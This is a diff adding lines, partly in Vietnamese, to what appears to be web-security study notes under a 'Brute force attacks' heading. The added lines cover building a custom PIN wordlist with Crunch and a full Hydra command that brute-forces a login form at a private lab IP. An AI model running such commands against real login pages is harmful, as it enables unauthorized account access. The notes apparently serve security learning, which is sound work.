@@ -7,6 +7,9 @@
 - **Stripping input:** If the input contains dangerous characters, these characters are removed before they are processed.
 ### Broken Authentication
 ##### Brute force attacks
+- Sử dụng tool Crunch để tạo custom wordlists: `crunch 3 3 0123456789ABCDEF -o 3digits.txt`
+- Sử dụng Burp suite Intruder hoặc hydra + wordlists custom hoặc rockyou.txt
+- Hydra: `hydra -l '' -P 3digits.txt -f -v 10.201.108.168 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
 ##### Use of weak credentials
 ##### Weak Session Cookies
 ##### Main defend
